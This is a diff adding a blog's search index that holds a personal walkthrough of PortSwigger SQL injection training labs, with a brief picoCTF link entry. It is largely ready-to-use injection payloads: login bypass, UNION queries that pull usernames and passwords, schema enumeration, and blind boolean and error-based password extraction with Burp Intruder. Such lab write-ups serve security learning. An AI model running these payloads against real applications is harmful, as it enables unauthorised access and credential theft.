class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure></div>
+
+<br>
+<br>
+
+<h4 id="SQL-injection-cheat-sheet"><a href="#SQL-injection-cheat-sheet" class="headerlink" title="SQL injection cheat sheet"></a>SQL injection cheat sheet</h4><div style="text-align: justify">
+
+<p>When a query returns only a single column, you can combine multiple values using concatenation operators. For example in Oracle, using <code>&#39; UNION SELECT username || &#39;~&#39; || password FROM users--</code> will concatenate usernames and passwords with a ~ separator.</p>
+</div>
+
+<table>
+<thead>
+<tr>
+<th align="center">Database</th>
+<th align="center">String Concatenation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Oracle</td>
+<td align="center">‘foo’||’bar’</td>
+</tr>
+<tr>
+<td align="center">Microsoft</td>
+<td align="center">‘foo’+’bar’</td>
+</tr>
+<tr>
+<td align="center">PostgreSQL</td>
+<td align="center">‘foo’||’bar’</td>
+</tr>
+<tr>
+<td align="center">MySQL</td>
+<td align="center">‘foo’ ‘bar’ or CONCAT(‘foo’,’bar’)</td>
+</tr>
+</tbody></table>
+<div style="text-align: justify">
+
+<p><code>dual</code> is a special table in Oracle database that contains only one row and one column. It’s commonly used when you need to execute SQL queries without accessing actual data tables - essentially acting as a dummy or temporary table.<br><code>&#39; UNION SELECT &#39;abc&#39; FROM dual</code></p>
+</div>
+
+<br>
+
+<table>
+<thead>
+<tr>
+<th align="center">Database type</th>
+<th align="center">Query for version</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Microsoft, MySQL</td>
+<td align="center"><code>SELECT @@version</code></td>
+</tr>
+<tr>
+<td align="center">Oracle</td>
+<td align="center"><code>SELECT * FROM v$version</code></td>
+</tr>
+<tr>
+<td align="center">PostgreSQL</td>
+<td align="center"><code>SELECT version()</code></td>
+</tr>
+</tbody></table>
+<p><code>&#39; UNION SELECT banner,&#39;def&#39; FROM v$version--</code></p>
+<br>
+
+<p>Query information_schema.tables to list the tables in the database.<br><code>SELECT * FROM information_schema.tables</code></p>
+<p>Query information_schema.columns to list the columns in individual tables.<br><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;Users&#39;</code></p>
+<p><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<h4 id="Lab-Vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><a href="#Lab-Vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data" class="headerlink" title="Lab: Vulnerability in WHERE clause allowing retrieval of hidden data"></a>Lab: Vulnerability in WHERE clause allowing retrieval of hidden data</h4><div style="text-align: justify">
+
+<p>The url of the commodity in the shop is, <code>https://link/product?productId=7</code>.<br>When I changed the <code>productId=1</code>, I could see the unreleased products.</p>
+<p>Use the filter, <code>https://link/filter?category=Clothing%2c+shoes+and+accessories</code>.<br>In the URL bar, you can see <code>category=</code>, so using <code>&#39; OR 1=1--</code> makes the condition after <code>category=</code> evaluate to true. When <code>category=&#39; OR 1=1--</code> is input, everything before the first <code>&#39;</code> and after <code>--</code> gets commented out in the SQL query, leaving just the <code>OR 1=1</code> condition which is always true.</p>
+<p><code>https://link/filter?category=&#39;or 1=1--</code></p>
+</div>
+<br><br><br><br><br><br>
+
+<h4 id="Lab-Vulnerability-allowing-login-bypass"><a href="#Lab-Vulnerability-allowing-login-bypass" class="headerlink" title="Lab: Vulnerability allowing login bypass"></a>Lab: Vulnerability allowing login bypass</h4><div style="text-align: justify">
+In the login page, you can see Username and Password fields. Entering `administrator'--` in the Username field comments out the Password part. This works like 
+
+<p><code>SELECT * FROM users WHERE username = &#39;administrator&#39;--&#39; AND password = &#39;&#39;</code>.</p>
+<p>Username: <code>administrator&#39;--</code><br>Password: <code>1234</code></p>
+</div>
+<br><br><br><br><br><br>
+
+<h4 id="Lab-Attack-querying-the-database-type-and-version-on-Oracle"><a href="#Lab-Attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="Lab: Attack, querying the database type and version on Oracle"></a>Lab: Attack, querying the database type and version on Oracle</h4><div style="text-align: justify">
+
+<p>First, try:<code>&#39; UNION SELECT &#39;abc&#39; FROM dual</code>. Then:<code>&#39; UNION SELECT &#39;abc&#39;,&#39;def&#39; FROM dual</code><br>Finally, modify to:<code>&#39; UNION SELECT banner,&#39;def&#39; FROM v$version--</code> to retrieve database version information.</p>
+<p><code>https://link/filter?category=Pets&#39; UNION SELECT banner,&#39;def&#39; FROM v$version--</code></p>
+</div>
+<br><br><br><br><br><br>
+
+<h4 id="Lab-Attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#Lab-Attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="Lab: Attack, querying the database type and version on MySQL and Microsoft"></a>Lab: Attack, querying the database type and version on MySQL and Microsoft</h4><div style="text-align: justify">
+
+<p>Testing with single quotes reveals improper handling, potentially making the website vulnerable to SQL Injection.<br>Using <code>&#39; ORDER BY 1--</code>, <code>&#39; ORDER BY 2--</code> … to test the number of columns.<br>In MySQL, using <code>#</code> as a comment terminator.<br>Finally using, <code>&#39; UNION SELECT @@version,&#39;James&#39;#</code>.<br>URL encoded as <code>&#39;+UNION+SELECT+%40%40version,NULL%23</code>.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/0.png"
+                      width="400" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/1.png"
+                      width="800" height="200"
+                ></p>
+<ul>
+<li><a class="link"   href="https://medium.com/@marduk.i.am/sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft-caf947d0208a" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+</div>
+<br><br><br><br><br><br>
+
+<h4 id="Lab-Attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#Lab-Attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="Lab: Attack, listing the database contents on non-Oracle databases"></a>Lab: Attack, listing the database contents on non-Oracle databases</h4><div style="text-align: justify">
+
+<p>First, test <code>&#39;+UNION+SELECT+NULL--</code> and <code>&#39;+UNION+SELECT+NULL,NULL--</code><br>to determine the number of columns.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/2.png"
+                      width="400" height="200"
+                ></p>
+<p>Then identify the table ID.<br><code>&#39;+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/3.png"
+                      width="100" height="100"
+                ></p>
+<p>Target specific table (users_mhimoo).<br><code>&#39;+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+where table_name=&#39;users_mhimoo&#39;--</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/4.png"
+                      width="400" height="200"
+                ></p>
+<p>After discovering column names, extract username and password from the table.<br><code>&#39;+UNION+SELECT+username_vrield,password_azniol+FROM+users_mhimoo--</code></p>
+<ul>
+<li><a class="link"   href="https://youtu.be/cC0_pFyvFtA?si=C4cIUIzHQBwINshy" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></div>
+<br><br><br><br><br><br></li>
+</ul>
+<h4 id="Lab-Attack-listing-the-database-contents-on-non-Oracle-databases-1"><a href="#Lab-Attack-listing-the-database-contents-on-non-Oracle-databases-1" class="headerlink" title="Lab: Attack, listing the database contents on non-Oracle databases"></a>Lab: Attack, listing the database contents on non-Oracle databases</h4><div style="text-align: justify">
+
+<p>To check column count, <code>&#39;+UNION+SELECT+&#39;abc&#39;,&#39;def&#39;+FROM+dual--</code>。<br>To examine table metadata in Oracle, <code>&#39; UNION SELECT table_name,NULL FROM all_tables--</code>。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/5.png"
+                      width="400" height="200"
+                ></p>
+<p>Found a table named USERS_RJXFRE, therefore used,<br><code>&#39; UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = &#39;USERS_RJXFRE&#39;--</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/6.png"
+                      width="400" height="200"
+                ></p>
+<p>Next, input using the column names that were found<br><code>&#39; UNION SELECT USERNAME_ZDEKLC,PASSWORD_DIZLXT FROM USERS_RJXFRE--</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/7.png"
+                      width="400" height="200"
+                ></p>
+</div>
+<br><br><br><br><br><br>
+
+
+<h4 id="Lab-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><a href="#Lab-UNION-attack-determining-the-number-of-columns-returned-by-the-query" class="headerlink" title="Lab: UNION attack, determining the number of columns returned by the query"></a>Lab: UNION attack, determining the number of columns returned by the query</h4><div style="text-align: justify">
+
+<p>You can observe that the table has 3 columns, so after <code>UNION</code> you should add three <code>NULL</code> values.<br><code>https://link/filter?category=Gifts&#39; UNION SELECT NULL,NULL,NULL--</code></p>
+</div>
+<br><br><br><br><br><br>
+
+<h4 id="Lab-UNION-attack-finding-a-column-containing-text"><a href="#Lab-UNION-attack-finding-a-column-containing-text" class="headerlink" title="Lab: UNION attack, finding a column containing text"></a>Lab: UNION attack, finding a column containing text</h4><div style="text-align: justify">
+
+<p>The question asks to <code>Make the database retrieve the string: &#39;kJKA4j&#39;</code>. First, verify if the return value is correct.<br>If the column data type is incompatible with string data, the injected query will cause a database error.</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT &#x27;</span>kJKA4j<span class="string">&#x27;,NULL,NULL--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;kJKA4j&#x27;</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL,NULL,&#x27;</span>kJKA4j<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+<p><code>https://link/filter?category=Gifts&#39; UNION SELECT NULL,&#39;kJKA4j&#39;,NULL--</code></p>
+</div>
+<br><br><br><br><br><br>
+
+<h4 id="Lab-UNION-attack-retrieving-data-from-other-tables"><a href="#Lab-UNION-attack-retrieving-data-from-other-tables" class="headerlink" title="Lab: UNION attack, retrieving data from other tables"></a>Lab: UNION attack, retrieving data from other tables</h4><div style="text-align: justify">
+
+<p>To successfully perform SQL injection, you need to first confirm the number and types of table columns. If you know the original query returns two columns that can store strings, and the database has a users table containing username and password columns, you can inject <code>&#39; UNION SELECT username, password FROM users--</code>.</p>
+<p><code>https://link/filter?category=Gifts&#39; UNION SELECT username, password FROM users--</code></p>
+</div>
+<br><br><br><br><br><br>
+
+
+
+<h4 id="Lab-UNION-attack-retrieving-multiple-values-in-a-single-column"><a href="#Lab-UNION-attack-retrieving-multiple-values-in-a-single-column" class="headerlink" title="Lab: UNION attack, retrieving multiple values in a single column"></a>Lab: UNION attack, retrieving multiple values in a single column</h4><div style="text-align: justify">
+Since the original query returns two columns and only the second column can store text data, we use NULL to fill the first column and concatenate username and password in the second text-capable column.
+
+<p>That’s why we use:<code>&#39; UNION SELECT NULL, username || password FROM users--</code><br>Instead of:<code>&#39; UNION SELECT username, password FROM users--</code></p>
+<p>First, try using:<code>&#39; UNION SELECT NULL, username || password FROM users--</code><br>Then, to separate username and password:<code>&#39; UNION SELECT NULL, username || &#39;~&#39; || password FROM users--</code><br>You can also use:<code>&#39; UNION SELECT NULL, username || &#39;*&#39; || password FROM users--</code></p>
+<p><code>https://link/filter?category=Tech+gifts&#39; UNION SELECT NULL, username || &#39;~&#39; || password FROM users--</code></p>
+</div>
+<br><br><br><br><br><br>
+
+
+<h4 id="Lab-Blind-SQL-injection-with-conditional-responses"><a href="#Lab-Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Lab: Blind SQL injection with conditional responses"></a>Lab: Blind SQL injection with conditional responses</h4><div style="text-align: justify">
+
+<p>First, confirm the TrackingId in the cookie.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/8.png"
+                      width="800" height="200"
+                ></p>
+<p>Use <code>&#39; and 1=1--</code> and encode it as <code>&#39;+and+1%3d1--</code>. The response should return “Welcome back”.</p>
+<p>Confirm the existence of the users table with the query<br><code>&#39; and (select &#39;x&#39; from users LIMIT 1)=&#39;x&#39;--</code>.<br>Encode it using (Ctrl+U) <code>&#39;+and+(select+&#39;x&#39;+from+users+LINIT+1)%3d&#39;x&#39;--</code>.</p>
+<p>Confirm the presence of username in the users table.<br><code>&#39; and (select username from users where username=&#39;administrator&#39;)=&#39;administrator&#39;--</code></p>
+<p>Confirm the presence of password in the users table.<br><code>&#39; and (select username from users where username=&#39;administrator&#39; and LENGTH(password)&gt;1)=&#39;administrator&#39;--</code><br>Password is exactly 20 characters.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/9.png"
+                      width="800" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/10.png"
+                      width="800" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/11.png"
+                      width="800" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/12.png"
+                      width="400" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/13.png"
+                      width="400" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/14.png"
+                      width="800" height="200"
+                ></p>
+<p><code>&#39; and (select substring(password,1,1) from users where username=&#39;administrator&#39;)=&#39;a&#39;--</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/15.png"
+                      width="800" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/16.png"
+                      width="800" height="200"
+                ></p>
+<p>Switch to a Cluster Bomb attack.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/17.png"
+                      width="800" height="200"
+                ></p>
+<p>Modify the query to <code>substring(password,$1$,1)</code> and <code>=&#39;$a$&#39;</code>.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/18.png"
+                      width="400" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/19.png"
+                      width="400" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/20.png"
+                      width="400" height="200"
+                ></p>
+<p>2ps9vcf81r0ovyjcrysn<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/21.png"
+                      width="400" height="200"
+                ></p>
+<ul>
+<li><a class="link"   href="https://youtu.be/W3zvXK9i75A?si=AB_MUpSpRoFGy4Sm" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></div>
+<br><br><br><br><br><br></li>
+</ul>
+<h4 id="Lab-Blind-SQL-injection-with-conditional-errors"><a href="#Lab-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Lab: Blind SQL injection with conditional errors"></a>Lab: Blind SQL injection with conditional errors</h4><div style="text-align: justify">
+
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- This command will not trigger an error because the condition (1=2) is always false. </span></span><br><span class="line"><span class="comment">-- The subquery returns &#x27;a&#x27;, making the overall condition true.</span></span><br><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END)=&#x27;</span>a</span><br><span class="line"></span><br><span class="line"><span class="comment">-- This command will trigger an error because the condition is true, </span></span><br><span class="line"><span class="comment">-- causing the 1/0 operation to execute, resulting in a mathematical error.</span></span><br><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END)=&#x27;</span>a</span><br></pre></td></tr></table></figure></div>
+<p>If the server does not properly sanitize the input, these commands will execute, proving the existence of an SQL Injection vulnerability. If the error causes a difference in the application’s HTTP response, you can use this to determine whether the injected condition is true.</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM dual)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN LENGTH(password)&gt;1 THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN LENGTH(password)&gt;100 THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>&#39; AND (SELECT CASE WHEN LENGTH(password)&gt;$100$ THEN TO_CHAR(1/0) ELSE &#39;$a$&#39; END FROM users WHERE username=&#39;administrator&#39;)=&#39;a&#39;--</code></p>
+<ul>
+<li><a class="link"   href="https://youtu.be/HjXUtCKm1FM?si=-Hy_Aru6UhdKSj2u" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></div>
+<br><br><br><br><br><br></li>
+</ul>
+<h4 id="Lab-Filter-bypass-via-XML-encoding"><a href="#Lab-Filter-bypass-via-XML-encoding" class="headerlink" title="Lab: Filter bypass via XML encoding"></a>Lab: Filter bypass via XML encoding</h4><p><br><br><br><br><br><br></p>
+]]></content>
+      <tags>
+        <tag>PortSwigger</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>picoCTF</title>
+    <url>/2024/11/30/picoCTF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p><a class="link"   href="https://hackmd.io/@dinosaur/HJpK08aQh" >https://hackmd.io/@dinosaur/HJpK08aQh<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   href="https://hackmd.io/@dinosaur/B1mEvLf96" >https://hackmd.io/@dinosaur/B1mEvLf96<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<!-- ### Binary -->
+]]></content>
+      <tags>
+        <tag>picoCTF</tag>
       </tags>
   </entry>
 </search>
